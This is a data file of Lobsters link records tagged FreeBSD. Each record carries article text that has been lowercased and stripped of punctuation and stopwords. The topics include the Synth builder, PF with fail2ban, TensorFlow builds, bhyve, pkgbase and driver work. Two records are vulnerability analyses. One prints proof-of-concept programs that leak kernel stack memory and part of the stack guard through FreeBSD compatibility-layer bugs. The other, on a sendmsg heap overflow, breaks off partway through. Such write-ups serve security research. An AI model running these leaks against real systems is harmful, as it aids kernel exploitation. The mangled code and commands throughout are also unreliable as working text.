nuxinl let know thought article love hear feedback
539,Lobsters,freebsd,FreeBSD,Synth - Custom package repository builder for FreeBSD and DragonFly,https://github.com/jrmarino/synth,synth custom package repository builder freebsd dragonfly,synth custom package repository builder freebsd dragonfly synth version synth help synth configure synth status synth upgradesystem synth preparesystem synth rebuildrepository synth justbuild port synth build port synth install port synth force port synth test port synth everything synth purgedistfiles miscellaneous custom makeconf graceful exit port option build log regular user noncurses mode web interface frequently asked question synth fails run inside jail synth ca nt fetch use proxy server fix synth configured prefetch suitable officiallybuilt package actually retrieved wrong use synth show updating information pkg redundant cached port option removed enmasse one configure synth use ccache synth configure ccache configure synth crossbuild binary qemuusermodehowto overview diagram significant article internet testimonial,synth custom package repository builder freebsd dragonfly synth advanced concurrent parallel port building tool aimed regular user prefer require building package source synth build package clean environment exactly mirror system build creates local repository installs pkg repository configuration file cause local package used highest priority automatically upgrade system single command synth version version screen appears synth executed command unknown command version command display current version copyright summary valid command along usage custom package repository builder freebsd dragonfly copyright c john r marino usage synth zeroparameteroption synth listoption list port origin filename zeroparameteroption includes help configure version status upgradesystem preparesystem statuseverything everything purgedistfiles rebuildrepository listoption includes status build justbuild install force test synth help help screen appears synth help entered command line provides slightly longer explanation command synth recognizes detailed explanation synth command please refer manual page eg man synth summary command line option see man page detail synth status dryrun show upgradesystem would build synth configure brings interactive configuration menu synth upgradesystem incremental rebuild installed package system afterwards local repository rebuilt system package automatically upgraded synth preparesystem like upgradesystem end repo rebuilt synth rebuildrepository rebuilds local synth repository command synth purgedistfiles deletes obsolete source distribution file synth statuseverything dryrun show everything would build synth everything build entire port tree rebuilds repository synth version display version description usage summary synth help display screen synth status port dryrun show rebuilt given list synth build port incrementally build port based given list asks updating repository system synth justbuild port like build skip postbuild question synth install port like build upgrade system without asking synth force port like build deletes existing package first synth test port build developeryes predeletes pkgs port spacedelimited list origin eg editorsjoe editorsemacs may also path file containing one origin per line two command form command argument eg help version take list port origin unlimited single path file containing list port origin one per line equivalent synth justbuild editorsjoe editorsnano editorslibreoffice synth justbuild tmpbuildlist file tmpbuildlist contains editorsjoe editorsnano editorslibreoffice synth configure synth us interactive menu configure based profile mix match part build system people use livesystem profile advanced user may custom base installed elsewhere prefer create profile us configuration also cover item many builder spawn building whether tmpfs used etc synth configuration profile livesystem port directory usrports b package directory varsynthlivepackages c distfiles directory usrportsdistfiles port option directory vardbports e build log directory varlogsynth f build base directory usrobjsynthlive g system root directory h compiler cache directory disabled num concurrent builder j max job per builder k use tmpfs work area true l use tmpfs localbase true display using ncurses true n fetch prebuilt package false switchcreate profile ret exit press key selection press letter item need configuring change marked asterisk pressing enter key carriage return save change synth status synth status synth status port synth statuseverything status command unique three version singular portslist form purpose status command perform dryrun intended command without actually changing anything system show package deleted due failed validity check package built result synth status command look current list installed package check given port tree calculates one outdated far rebuild cascade result number package rebuilt bring current package date synth status port accepts list port check local repository determines actually rebuilt synth statuseverything command return incremental list port would built entire port tree requested obviously command average user synth status port would built n ew r ebuild u pgrade n n develicu n total package would built complete build list also found varsynthsynthstatusresultstxt synth upgradesystem popular command would used bringing port tree date executing synth upgradesystem perform analysis synth status starting building required port concurrently finished local repository updated finally system pkg program commanded update system using local repository build process build status shown updated every second user see result recent build limited screen size status builder statistic include system load swap status average number package built per hour impulse statistic package build rate last second line column builder section current length build log updated second synth preparesystem command similar synth upgradesystem command except stop rebuilding local repository sysadmin upgrade system using pkg leisure synth rebuildrepository command sanity check built package remove invalid one create local repository comprised package remain synth justbuild port command build list given port finished program provide final tally result exit synth build port command build list given port finished prompt user answer true f false want rebuild local repository prescanning take minute normally answer would f user belief last package built repository rebuilt user asked another tf question confirm want install specifically listed port system synth install port command synth build port except ask question build finished rebuilds repository installs port automatically synth force port command similar synth build port difference package exists listed port deleted first even perfectly valid uptodate package result synth build command could nothing get built synth force always build requested synth test port command similar synth force port difference port built developer mode additional check make build log suitable submitting freebsd bugzilla alternative poudriere synth everything vast majority people need synth everything command build every package port tree rebuilds local repository without asking done synth purgedistfiles command remove previously fetched distfiles longer referenced port tree take minute scan everything deletes file enmasse without asking miscellaneous custom makeconf file match path usrlocaletcsynth profile makeconf profile name selected configuration profile appended builder stock makeconf note default profile name livesystem would make path usrlocaletcsynthlivesystemmakeconf user graceful exit hit controlc build want stop building hit controlq combination synth exit soon hit building process finish package currently building wo nt start new one port option synth us cached option saved synth scan option file starting build obsolete number option nt match current port option name different etc print problematic port halt recommending cached option either removed resaved something valid build package nondefault option run make c usrports category portname config staring build build log every build produce log default located varlogssynth location configurable log name format category portname log regular user right synth executed root user noncurses mode text mode building phase show much le information cursesbased screen curse acting text mode get job done fine also cron launch synth required using profile disabled curse display web interface starting version dynamic web report automatically generated every build report created report subdirectory log directory varlogsynthreportindexhtml default report updated time per minute entire build history retained searchable run reset upon subsequent run addition standard search navigation option several area report clickable click built failed ignored skipped field click filter result clicking total field remove search filter additionally every cell column filter history port origin particularly useful finding port builder skipped due build failure finding port set ignore builder id column cell also trigger quick filter work performed builder view report localhost simply navigate browser report directory view remotely web server installed running configured expose synth log directory remote browser frequently asked question synth fails run inside jail first benefit running synth inside jail internally creates jaillike environment builder add another layer around synth nt provide extra protection recommended nt even bother wait nt care recommendation demand able run synth jail okay add following jailconf allowmount allowmountnullfs allowmounttmpfs allowmountdevfs allowchflags courtesy dewayne geraghty synth ca nt fetch use proxy server fix requires providing custom environment variable create file named usrlocaletcsynthenvironment eg livesystemenvironment define one variable per line eg httpproxyhttp ftpproxyhttp httpproxyhttp ftpproxyhttp change url port number match actual proxy server port course synth configured prefetch suitable officiallybuilt package actually retrieved wrong happens freebsd user freebsd basically two official repository quarterly latest release later pkg configured use quarterly package default earlier release configured use latest package either repository fine provided port tree match decided continue quarterly branch fine choice nt like constant rebuilding need provide synth svn version port tree set quarterly branch could deduced name new svn branch created every three month synth user choose quarterly port package need remember switch branch january april july october want newest version software always still leverage prebuilt package ensure pkg configured latest package port tree well unlikely quarterly user latest user never change port tree configuration use synth show updating information use pkg accomplish add something like cshrc file alias pnotes date v xargs pkg updating date next time log command pnotes display last week worth updating entry based installed system note entry portmaster portupgrade user action synthpkg user great majority entry courtesy matt smith redundant cached port option removed enmasse yes uncommon existing port option cache contain redundant file happens people build port live system hit ok option dialog appears cause option setting saved unnecessary setting default later cause issue port maintainer update option longer match saved value redundant file listed like binsh usrportstoolsscriptsredundantoptfilessh delete redundant option pipe output rm binsh usrportstoolsscriptsredundantoptfilessh xargs rm rf one configure synth use ccache first install ccache pkg install ccache cd usrportsdevelccache make install check initial configuration ccache cache directory rootccache primary config rootccacheccacheconf secondary config readonly usrlocaletcccacheconf cache hit direct cache hit preprocessed cache miss file cache cache size kb max cache size gb update maximum cache size ccache set cache size limit gb set cache location want eg varcacheccache ccache setconfigcachedirvarcacheccache check configuration ccache cache directory varcacheccache primary config rootccacheccacheconf secondary config readonly usrlocaletcccacheconf cache hit direct cache hit preprocessed cache miss file cache cache size kb max cache size gb run synth configure selection option h enter value cache directory varcacheccache example synth building run ccache command repeatedly another terminal check statistic changing build ccache properly configured configure synth crossbuild binary synth configured crossbuild package bit help binmiscctl qemuuserstatic port currently synth support crossbuilds freebsd note synth also work natively option available freebsdarm following example demonstrates build crossbuild host us qemuusermodehowto reference first set sysroot used chroot cd usrsrc make j targetarm buildworld make destdir sysroot targetarm installworld new sysroot also need make destdir sysroot targetarm distribution host environment build qemuuserstatic copy emulator binary sysroot directory mounted synth build eg sbin register binary use emulator chroot synth install emulatorsqemuuserstatic cp usrlocalbinqemuarmstatic sysrootsbin binmiscctl add armelf interpreter sbinqemuarmstatic magic mask size setenabled mount devfs devfs destdir dev sysroot ready used tested chroot u root sysroot root helios file usrbinfile usrbinfile elf lsb executable arm version freebsd dynamically linked interpreter freebsd freebsdstyle stripped new chroot environment varrunldelfsohints need generated root helios service ldconfig start set separate log directory package repos synth host mkdir mkdir create new profile eg armbuild use crossbuilding particular change package directory build log directory system root directory run crossbuilding synth host environment need ensure correct profile package repository database consulted eg env synthprofilearmbuild pkgdbdir sysroot vardbpkg synth build current drawback synth upgradesystem work update host crossbuild courtesy jonathan chen overview diagram significant article internet testimonial chrish freebsd forum member january marino regarding smooth silk completed updating box using version everything went flawlessly failure handled gracefully well event well save screen corruption due kernel message sent nt see anything changelog indicate change regard wishful thinking part thank much john dev box thanks also garry freebsd forum member january used build new repository reproducing previously built portsmgmtpoudriere using general setup jail job tmpfs workdir data synth built package hour wall time problem taken hour wall time build repository poudriere seems synth efficient setting tearing builder chroot jail noticed small package done second synth take minimum two minute poudriere synth pleasant use thanks fernandel february also using synth first day year spent portmaster happy thankful synth port marino help thank btw start synthupgrade system bad time morning everything done crivens moderator freebsd forum feb one would take moment thank great software thread turning rope sort thing hopefully turn chapter handbook protocelt moderator freebsd forum feb port installed workstation last repository rebuild ccache cache fully populated synth took around hour rebuild entire repository nt know long poudriere took machine know longer thought mistake port getting rebuilt checking fact rebuilt quite fast packetman freebsd forum member jan feb really liking synth thank much marino yes synth great tool ca nt wait roll machine freebsd forum member march marino thank lot great tool explanation used mysterious crash running portmaster day use synth exclusively crash nt happen anymore tried use poudriere much slowish simple need home desktop
542,Lobsters,freebsd,FreeBSD,Configuring PF and Fail2ban on FreeBSD,https://cmcenroe.me/2016/06/04/freebsd-pf-fail2ban.html,configuring pf freebsd,digitalocean droplet freebsd several packet filter openbsd man page nginx znc curl address resolution protocol neighbor discovery protocol pkg kqueue pf table,jul jc wrote writing blog post couple year back configuring freebsd pf post helpful might need slight update work new elaborate much email since see detail git issue page scroll bottom get summary another quick discussion basically new line need added etcpfconf translation section nat rdr rule work updated recently created new digitalocean droplet using freebsd image learning administer setting basic seemed like good idea set firewall take long start seeing failed login attempt varlogauthlog first thing choose firewall freebsd provides several among packet filter pf openbsd seemed like good choice learn since knowledge transferable system get started created simple pfconf reading excellent man page block pas configuration drop incoming packet allow outgoing packet enable firewall echo pfenable yes etcrcconf service pf start ssh connection dropped always finish configuring firewall starting ssh logging console digitalocean disabling pf expanded configuration tcpservices ssh http http block pas proto tcp port tcpservices pas tcpservices macro used list port allow incoming packet number name looked etcservices reenabling pf everything seemed work first ssh still worked could load default nginx page however outgoing connection znc instance irc network began dropping also noticed attempt curl google took upwards second firewall enabled output curl v revealed clue pf disabled connection made enabled curl attempted make connection timing falling back turn address resolution protocol arp replaced neighbor discovery protocol ndp part mean essential work inadvertently blocked block allow icmp traffic added two new rule pfconf pas quick inet proto icmp pas quick proto adding quick rule mean pf evaluate rule match firewall configured time set installed pkg along pyinotify kqueue support pkg install pkg install default configuration override put jaillocal first needed tell use pf refers file add banned ip address pf table called anything register address pf needed add rule pfconf block traffic table persist block quick added rule directly block took precedence icmp rule back enabled ssh jail watch failed logins varlogauthlog reloaded pf configuration started service pf reload echo yes etcrcconf service start see action tail log list address table inspect statistic pf rule tail pfctl show pfctl v rule final pfconf look like set skip pas quick tcpservices ssh http http table persist block block quick pas quick inet proto icmp pas quick proto pas proto tcp port tcpservices added first line none rule apply loopback interface final jaillocal look like default bantime findtime maxretry banaction pf sshd enabled true tweaked setting three failed logins one hour result ban
543,Lobsters,freebsd,FreeBSD,TensorFlow on FreeBSD,https://ecc-comp.blogspot.com/2016/06/tensorflow-on-freebsd.html,tensorflow freebsd,tensorflow download setup instruction bazel google build tool realized link active downloaded port bazel instruction run instruction gpu support another warning,beginning day journey issue tensorflow related bsd course nt useful first thing freebsd user looking software nt officially supported look unofficial port course nothing looked relevant result related github issue closed build system blame alright great start first apologize supplying port archive reading freebsd handbook creating port complex task right using freebsd two week would also like waste anyone time giving terrible port archive mess system instead explain surprisingly easy put time investigating certain problem happen began reading standard tensorflow download setup instruction since knew freebsd linux compatibility layer tried loading python pip package obviously nt work learned shortly freebsd support binary remember hearing people mac somewhat based freebsd following mac instruction met incompatible binary error expected point needed compile source followed mac instruction one linux talked gpu support bunch thing would made harder downright possible first wall hit compiling bazel google build tool error output totally put wanting continue luckily digging glimmer hope follow bugzilla link lead real bug report first thought end line attachment port emailed author responded fairly quickly looking back realized link active downloaded port bazel recommend use clang build everything throughout entire process least trouble work fiddle around bit bazel installed move onto real fun compiling tensorflow originally intention write nt record made change thank god version control keeping track thing instruction forewarning liable damage system command require root access override thing warned make following change file tensorflowcoreplatformdefaultthreadannotationsh around line defined clang defined swig define threadannotationattribute x attribute x else define threadannotationattribute x noop endif tensorflowcoreplatformposixposixfilesystemcc around line defined apple case enonet machine network endif tensorflowstreamexecutorrngcc btensorflowstreamexecutorrngcc around line defined apple const int rngsupport kminseedbytes const int rngsupport kmaxseedbytes endif next run ln usrbinlibcso usrliblibdlso provides function build process need finish remove cc rm usrbincc replace following script binsh usrbinclang lm make sure executable necessary package nt link math library build process tensorflow look really huge shortcut get warning compilation process lm unused lot nt make difference follow standard process detail page location python must use python tried python nt work whatever reason trying lot different thing could definitely work run instruction gpu support name output package tmptensorflowpkg different picture another warning ram computer grind halt careful important work open freebsd kill process period time though start woohoo running tensorflow freebsd frickin beautiful really encourage anyone submit proper pull request nt know enough bazel nt want submit one honestly tired messing around done freebsd guru make port archive time enjoy another picture really action eating core training convolutional neural network really knew going
544,Lobsters,freebsd,FreeBSD,Analysis of stack disclosure vulnerabilities in FreeBSD compatibility layers,https://cturt.github.io/compat-info-leaks.html,analysis stack disclosure vulnerability freebsd compatibility layer,analysis stack disclosure vulnerability freebsd compatibility layer introduction linux binary building custom kernel freebsd security team syscompatlinuxlinuxioctlc syscompatlinuxlinuxioctlc poc syscompatlinuxlinuxmiscc poc syskernvfssyscallsc poc leveraging content leaked data syscompatlinuxlinuxioctlc target leak msdosfsreaddir setfkey summary,analysis stack disclosure vulnerability freebsd compatibility layer initial publication may introduction arguably one freebsd renowned feature compatibility layer particular freebsd provides compatibility layer linux binary legacy software usually enabled building custom kernel configuration option however linux compatibility layer also implemented separate kernel module loaded runtime instead kldload linux discovered multiple information leak vulnerability implementation compatibility layer allow unprivileged user leak large amount potentially sensitive uninitialised stack data vulnerability assigned freebsd security team commit reference patch bug may found article give quick explanation bug found along poc code demonstrate impact type vulnerability using one bug partially leak stack guard detail code excerpt article taken freebsd however vulnerability present version well tiocgserial first vulnerability resides tiocgserial command linux compatibility layer ioctl handler virtual terminal function partially initialises content l struct copying userland syscompatlinuxlinuxioctlc static int linuxioctltermio struct thread td struct linuxioctlargs args struct termios bios struct linuxtermios lios struct linuxtermio lio caprightst right struct file fp int error error fget td args fd caprightsinit right capioctl fp error return error switch args cmd case linuxtiocgserial struct linuxserialstruct l lsstype lssflags lssclosedelay error copyout l void args arg sizeof l break fdrop fp td return error looking declaration struct type immediately obvious issue syscompatlinuxlinuxioctlc struct linuxserialstruct int type int line int port int irq int flag int xmitfifosize int customdivisor int baudbase unsigned short closedelay char reservedchar int unsigned short closingwait unsigned short int reserved type flag closedelay member struct initialised copied userland member contain uninitialised stack data total command allows u leak byte poc following poc code demonstrates triggering tiocgserial bug displaying leaked kernel memory need compiled linux binary include stdioh include stdlibh include stddefh include errnoh include fcntlh include sysioctlh include linuxserialh static void hexdump const void data sizet size sizet size printf c char data n printf n int main void struct serialstruct l sizet leaked int fd open fd perror open exit int r ioctl fd tiocgserial l r perror ioctl exit printf total size zun sizeof l leaked sizeof l printf content n hexdump l sizeof l define initialised member printf initialised member zu n offsetof struct serialstruct member member sizeof lssmember leaked sizeof lssmember initialised type initialised flag initialised closedelay printf total byte leaked zun leaked return sample output total size content fe ff ff ff ff fe ff ff ff ff ff ff fe ff ff fe ff ff fe ff ff initialised member type initialised member flag initialised member closedelay total byte leaked kernel pointer clearly contained content leaked memory sysinfo next vulnerability also affect linux compatibility layer resides sysinfo system call implementation function partially initialises content syinfo struct copying userland syscompatlinuxlinuxmiscc struct lsysinfo llong uptime second since boot lulong load minute load average define linuxsysinfoloadsscale lulong totalram total usable main memory size lulong freeram available memory size lulong sharedram amount shared memory lulong bufferram memory used buffer lulong totalswap total swap space size lulong freeswap swap space still available lushort procs number current process lushort pad lulong totalbig lulong freebig luint memunit char f sizeof llong sizeof lint padding int linuxsysinfo struct thread td struct linuxsysinfoargs args struct lsysinfo sysinfo vmobjectt object int j struct timespec t getnanouptime t tstvnsec tstvsec sysinfouptime tstvsec use information mib get load average sysinfoloads averunnableldavg linuxsysinfoloadsscale averunnablefscale sysinfototalram physmem pagesize sysinfofreeram sysinfototalram cntvwirecount pagesize sysinfosharedram mtxlock vmobjectlistmtx tailqforeach object vmobjectlist objectlist object shadowcount sysinfosharedram object residentpagecount mtxunlock vmobjectlistmtx sysinfosharedram pagesize sysinfobufferram swappagerstatus j sysinfototalswap pagesize sysinfofreeswap j pagesize sysinfoprocs nprocs following present newer linux kernel sysinfototalbig sysinfofreebig sysinfomemunit return copyout sysinfo args info sizeof sysinfo bug slightly subtle leaked data hide padding byte struct total amount data leaked system call byte poc following poc code demonstrates triggering sysinfo bug displaying leaked kernel memory need compiled linux binary include stdioh include stdlibh include syssysinfoh static void hexdump const void data sizet size sizet size printf c char data n printf n int main void struct sysinfo info sysinfo info printf leaked data n hexdump char infoprocs sizeof short hexdump infof sizeof infof printf zu byte totaln sizeof short sizeof infof return sample output leaked data byte total ostat final bug affect compatibility layer resides cvtstat function used ostat ofstat system call function partially initialises content ost struct copying userland syskernvfssyscallsc int ostat td uap struct thread td register struct ostatargs char path struct ostat ub uap struct stat sb struct ostat osb int error error kernstat td uap path uiouserspace sb error return error cvtstat sb osb return copyout osb uap ub sizeof osb convert old new stat structure void cvtstat st ost struct stat st struct ostat ost ost stdev st stdev ost stino st stino ost stmode st stmode ost stnlink st stnlink ost stuid st stuid ost stgid st stgid ost strdev st strdev st stsize quadt ost stsize st stsize else ost stsize ost statim st statim ost stmtim st stmtim ost stctim st stctim ost stblksize st stblksize ost stblocks st stblocks ost stflags st stflags ost stgen st stgen bug leak total byte padding struct poc following poc code demonstrates triggering ostat bug displaying leaked kernel memory compiled freebsd using default clang compiler include stdioh include unistdh int main void char oub syscall oub printf leaked data n printf oub oub printf oub oub return sample output leaked data leveraging content leaked data leaked memory vulnerability contain different kind data depending stack frame previously called function example demonstrate using linuxtiocsserial command nothing copyin user supplied struct onto stack syscompatlinuxlinuxioctlc case linuxtiocsserial struct linuxserialstruct l error copyin void args arg l sizeof l error break xxx really help implementation nothing error break using command triggering tiocgserial bug observe reminants memory passed previous call leaked data include stdioh include stdlibh include stddefh include stringh include errnoh include fcntlh include sysioctlh include linuxserialh static void hexdump const void data sizet size sizet size printf c char data n printf n int main void struct serialstruct l int fd open fd perror open exit memset l sizeof l ioctl fd tiocsserial l ioctl fd tiocgserial l printf content n hexdump l sizeof l return sample output content fe ff ff ff ff fe ff ff ff ff ff ff fe ff ff fe ff ff target leak modern operating system kind info leak usually used obtain kernel address used calculate kernel slide bypass kernel aslr however since freebsd still nt support kernel aslr instead focus bypassing another exploit mitigation mechanism use bug attempt leak stack guard incredibly valuable attacker used enable exploitation many kernel stack overflow would otherwise dismissed unexploitable msdosfsreaddir spring mind leak stack guard need identify system call appropriate stack frame line offset stack guard offset read later depending exact version architecture freebsd target different system call may suitible bug however article focus freebsd following poc code demonstrates leaking byte stack guard sysinfo bug abusing stack frame linuxnewuname need compiled linux binary include stdioh include stdlibh include syssysinfoh include sysutsnameh int main void struct sysinfo info uname null sysinfo info printf partial stack guard leak short char infoprocs return easiest way verify output program compare stack guard leaked separate vulnerability setfkey however system patched vulnerability either dump stack guard gdb write custom kernel module summary whilst compatibility layer undoubtedly useful feature freebsd aware using always expose system increased attack surface article provided several example obvious info leak discovered layer demonstrated impact severe attacker identified appropriate stack frame leak sensitive data like stack guard
545,Lobsters,freebsd,FreeBSD,bhyve graphics support,https://lists.freebsd.org/pipermail/freebsd-virtualization/2016-May/004471.html,bhyve graphic support,bhyve graphic support grehan freebsdorg http svnfreebsdorgbaseprojectsbhyvegraphics http http information freebsdvirtualization mailing list,bhyve graphic support peter grehan grehan freebsdorg fri may utc support graphic output checked projectsbhyvegraphics branch usrsbinbhyve executable quick easy build source assuming reasonably current source tree usrsrc svn co http svnfreebsdorgbaseprojectsbhyvegraphics pathtodir cd pathtodir make bhyvesysdirusrsrc usrsrcsharemk uefi gop support checked repo http prebuilt bhyveuefi binary image gop support available http new bhyve executable support new device example using bhyve c ahcicd ahcihd fbuf wait xhci tablet lpc l bootrom h w window framebuffer device fbuf take parameter describing vnc server option optional wait parameter hold execution guest vnc client connected height width frame buffer specified constraint maximum arbitrary resolution yet supported uefi fixed meantime available resolution x x x x x x x x x specifying unsupported resolution result uefi falling back xhci emulation currently tablet back end connects pointer input vnc present pointer input default mouse emulation note latter suppports relative coordinate nt track cursor well vnc keyboard input currently default keyboard code tested window server ubuntu freebsd note older version window freebsd nt like xhci tablet default mouse used vnc client tightvnc tighervnc realvnc aka vnc viewer tested various host osx vnc client known work give try let u know go many thanks michael dexter helping testing later peter information freebsdvirtualization mailing list
546,Lobsters,freebsd,FreeBSD,Michael's FreeBSD Story,https://www.freebsdfoundation.org/blog/faces-of-freebsd-2016-michael-lucas/,michael freebsd story,face freebsd michael story,face freebsd back popular demand sharing story someone involved freebsd face freebsd series may story someone received funding u work development project run conference travel conference advocate freebsd may someone give back freebsd financially another way regardless always someone making positive difference freebsd world chance get know fellow freebsd enthusiast sit back enjoy next face freebsd story michael story name michael w lucas originally rochester michigan usa little farm town outside detroit michigan kid bike past grain elevator see great big pallet purina monkey chow next train track asked dad sent wood field find monkey farm really monkey farm mile east town inside one many building comprising parkedavis pharmaceutical research lab inside tenfoot fence topped tetanuslaced barbed wire armed guard patrolled fence presumably keep monkey seizing lab sparking revolution dad knew perfectly well telling would spoiled fun naturally drifted system administration gene found freebsd let sleep national science foundation handed internet commercial entity said something internet backbone hiring people fast could find gave secure lowpaying gig university library book cataloger make something exciting internet industry maybe could work night friend amanda insisted nobody would bug forget experienced system administrator hard find detroit inexperienced one new employer provided backbone connectivity transit internet service provider took people potential threw deep end making responsible system really qualified run either swam sank lived flat border grosse pointe wood detroit people behind drove bmws front building bullet scar idea get one fancy car much aware exactly happened sank felt motivated learn fast could well enough become backup dns admin learned edit zone file mangle namedboot came pm one night told dns administrator got walked door new lead dns administrator make server work good luck working night many thing recommend get long stretch time focus project like figuring ip stack work really mastering minesweeper lead service especially vital service like dns people work miserable hour sun burn overhead problem calling day sco unixware master dns server kept randomly unpredictably dying solaris one screamed agony every six hour easily fixed cron job reboot every three caching nameservers ran everything sunos window nt nothing could handle load put equipment every time phone rang obscene hour like eleven grew motivated fix thing little short sleep one day usenet administrator said good luck handed freebsd forget hallucinatory lack uninterrupted sleep tried clientfacing dns server office figuring worse screaming nightmare replaced ran default install enabled caching dns server stumbled home hoping would hold together couple hour could get nap phone ring almost three pm unixware box soiled somehow miracle experimental freebsd box held together pretty sure died nobody bothered tell got work saw still running still answering query last told decided come back every hour check morbidly curious exactly would scream die expected server could keep running long would fail new interesting manner though right due go thing still running answering query weird reboot thought twentyfour hour way freebsd hold together another day touch something magical happening even breathe system start crashing like everything else silly reboot left freebsd host running see would happen call came ten solaris box refused boot even right good kicking put freebsd server place rest say history eventually became freebsd doc committer eventually let access expire favor writing book lot people write improve doc many want write book completed set four freebsd storage book two cowritten allan jude happy came freebsd mastery advanced zfs tome complicated brainstretching book ever written forthcoming pam book certainly cover freebsd people keep telling absolute freebsd classic classic go vote joyce ulysses pynchon gravity rainbow something like whatever book project bring contact whole bunch freebsd community everyone generous time happy correct work make print occasionally developer even say hold right let fix publish making people work harder give warm fuzzy feeling everybody win world changed last year rochester much farm town grown fivestar hotel boutique great big house forgiven amanda getting first internet job freebsd longer guy releasing stuff internet whole bunch people freebsd whole bunch different corporate backer year corporation distressing tendency collapse get sold fold business change core competency hamster ranching freebsd foundation specifically dedicated soliciting support project directing resource developing badlyneeded feature published first freebsd article sys admin magazine back late freebsd press rare successful freebsd journal much possibility people would actually meet person unless coincidence usenix lisa something like today bsdcan ottawa asiabsdcon tokyo eurobsdcon random european city plus assortment developer summit like bsdcam sponsored freebsd foundation weirdly conference welcome maybe send anyone looking monkey farm one outside ottawa case
547,Lobsters,freebsd,FreeBSD,Followup on packaging base with pkg(8),https://lists.freebsd.org/pipermail/freebsd-pkgbase/2016-May/000238.html,followup packaging base pkg,followup packaging base pkg gjb freebsdorg http http information freebsdpkgbase mailing list,followup packaging base pkg glen barber gjb freebsdorg thu may utc dear freebsd community early year announced freebsd would ship ability package base system pkg intent use pkg primary binary upgrade mechanism base system despite schedule adjustment allow additional time resolve several issue prior merge head many issue remained following merge head many issue discovered resolved many without clear nondisruptive solution given state highlydisruptive change base system need take best interest freebsd community primary consideration whole arrived difficult decision treat packaged base beta feature continue freebsdupdate primary binary upgrade mechanism release development change continue head branched however target goal transitioning pkg base system fully intend way constitute pola violation especially established stable branch detail attempt transition still determined however technical solvable detail ensure best avoid violating pola transition remaining issue resolved point risk far outweigh benefit especially taking consideration recent fallout several change thank everyone supported effort hope continue support test forward development packaging base system pkg thank http glen behalf next part nontext attachment scrubbed name signatureasc type applicationpgpsignature size byte desc available url http information freebsdpkgbase mailing list
548,Lobsters,freebsd,FreeBSD,"Updating the broadcom softmac driver (bwn), or ""damnit, I said I'd never do this!""",http://adrianchadd.blogspot.com/2016/05/updating-broadcom-softmac-driver-bwn-or.html,updating broadcom softmac driver bwn damnit said never,,watching freebsd commit list may noticed kinda sprayed lot change broadcom softmac driver firstly swore never touch stuff use broadcom fullmac part work order get peek hood see work decided fixing bwn vaguely work related yes work outside work sponsored employer found small cache broadcom card plugged one nope nt work tried another nope nt work oh wait need make sure right firmware module loaded continue first hiccup set interface connected home ap worked second packet loss worked right ap could receive packet fine transmits failing went read transmit completion path code first fun bit tx completion descriptor checked firmware driver bwi firmware instead read pair shared memory register get completion status packet learnt first fun bit hardware api mix piodma firmware descriptor shared memory mailbox completion register reading advance internal firmware state read next descriptor completion ca nt read fun miss transmit completion yes transmitting failing retry count ack bit ok failed using rate control code turned rate control debugging wlandebug rate watched hilarity rate control code never seeing failure thought everything hunky dory kept pushing rate exact wrong thing turn rate control code called meant notified packet succeeded fixed revision rate control notification path called always error success began behaving better bwn useful need updating support chipsets certainly nt operation anything went investigate thankfully three major source broadcom softmac information linux linux brcmsmac http linux folk huge reverse engineering effort binary broadcom driver wl many year generated specification document implemented pretty amazing honest armed went attempt implement support first chip architectural thing know chip firstly broadcom hardware structured like chip really bunch core ondie interconnect host bus glue hardware design reuse internals different host bus usb pci sdio etc reuse chip design huge win chip lie internal layout nt care map internal core one big register window space look like one device broadcom part nt expose core internally bus need switch core onoff also map mmio register window access yes right one big register window map thing pci style want speak core unmap existing core map core want register access secondly core expose mac phy register ca nt switch onoff mac register window poke phy armed understand need sysdevsiba siba use bwn siba driver provides interface pci mips older broadcom part probeattach siba bus enumerate core attach driver typically pcipcie core core chipcommon core clockpower management thing needed memory usb pcmcia etc bwn nt attach pci device sits siba bus child device add support new chip needed thing device need probeattach siba sprom parsing done siba new field added core revision probeattached bwn add needed ensure right microcode radio initvals added bwn new phy code needed phyn two open phyn implementation brcmfmac bsd licenced gpl licenced looked brcmfmac one includes full support decided interface different first port phyn code smaller simpler api matched specification importantly bwn written specification naturally alignment meant would adding code bwn decided dump sysgnudevbwn away main driver make compiling nonstandard point yes like port brcmfmac phys freebsd wanted get familiar chip make sure driver worked fine debugging broken new piece nt sound like fun day got phyn compiling fired needed add sprom field parsing moment truth fired connected scanned worked almost first time two thing broken operation failed entirely transmit operation failed transmitting ofdm frame cck fine since probing association authentication lowest rate cck worked fine data packet ofdm rate failed phy error nt documented anywhere god know mean cck fine went brcmfmac driver see missing piece two well three two broke everything firstly flag tx descriptor set operation nothing secondly driver try fallback rate primary rate fails hardcoded rtscts rate turn fallback rate ofdm cck invalid fixed nt yet fixed cck rtscts rate go soon also submitted patch linux fix thirdly kicker phyn later phys require detailed tx setup completely missing initializing descriptor field turn also required phylp support somehow phy okay added field ofdm transmit worked fine week started stable driver chip well operation phyn nic yet obviously wait next post cover fixing rx rssi calculation needed also phyn chip much later core required new microcode new descriptor interface
549,Lobsters,freebsd,FreeBSD,"Analysis of CVE-2016-1887, sendmsg FreeBSD kernel heap overflow",https://cturt.github.io/sendmsg.html,analysis sendmsg freebsd kernel heap overflow,analysis freebsd kernel heap overflow introduction freebsd security team security advisory commit bug commit syskernuipcsyscallsc syskernuipcsyscallsc patch freebsd site heap overflow syskernuipcsyscallsc mbufinit syskernuipcmbufc triggering syskernuipcsyscallsc socklent syskernuipcsyscallsc poc controlling overflow size analysis kernel heap overflow heap manipulation unix domain socket fork bomb argp dumping overflow memory target overflow syssysmbufh mbuf syskernuipcusrreqc sysvmumacorec returning payload uzrelease restoration summary thanks,analysis sendmsg freebsd kernel heap overflow initial publication may introduction kernel heap overflow introduced freebsd release may triggered unprivileged user default installation vulnerability nt require additional kernel module running configuration change nt specific architecture reported bug freebsd security team april assigned security advisory article aim provide explanation bug demonstrate impact using gain arbitrary kernel code execution unprivileged user always since interest finding analysing bug publishing fully weaponised exploit source code leave development point privilege escalation cleanly restoring corruption exercise reader detail code excerpt taken freebsd latest version written however little relevant code seems changed since release function moved syskernuipcmbufc syskernkernmbufc since commit bug since commit sockargs function longer performs bound check size argument catch negative value faulty commit sockargs would cast buflen uint bound check value negative signed integer would handled large positive value casting would result einval returned syskernuipcsyscallsc int sockargs mp buf buflen type struct mbuf mp caddrt buf int buflen type struct sockaddr sa struct mbuf int error uint buflen mlen ifdef compatoldsock type mtsoname uint buflen buflen mlen unix domain compat hack else endif uint buflen mclbytes return einval commit sockargs accept negative value buflen since buflen mlen check longer catch syskernuipcsyscallsc int sockargs mp buf buflen type struct mbuf mp caddrt buf int buflen type struct sockaddr sa struct mbuf int error buflen mlen ifdef compatoldsock type mtsoname buflen buflen 